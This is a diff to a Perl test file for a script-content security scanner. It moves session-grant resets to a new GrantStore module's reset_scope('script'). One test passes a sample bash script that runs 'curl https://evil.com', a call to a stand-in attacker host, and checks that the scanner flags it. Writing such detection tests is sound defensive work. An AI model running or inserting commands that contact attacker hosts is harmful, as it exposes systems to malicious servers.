@@ -20,6 +20,7 @@ sub get {
 package main;
 
 use CLIO::Tools::FileOperations;
+use CLIO::Security::GrantStore;
 
 my $pass = 0;
 my $fail = 0;
@@ -144,14 +145,14 @@ print "\n--- Session grants ---\n";
 
 {
     # Reset grants first
-    CLIO::Tools::FileOperations::reset_script_session_grants();
+    CLIO::Security::GrantStore::reset_scope('script');
 
     my $r = $fops->_scan_script_content('deploy.sh', "#!/bin/bash\ncurl https://evil.com", $std_ctx);
     ok(defined $r, "before grant: script flagged");
 
     # Simulate session grant
     # We can't easily test the prompt, but we can test grant reset
-    CLIO::Tools::FileOperations::reset_script_session_grants();
+    CLIO::Security::GrantStore::reset_scope('script');
 }
 
 # --- Summary ---
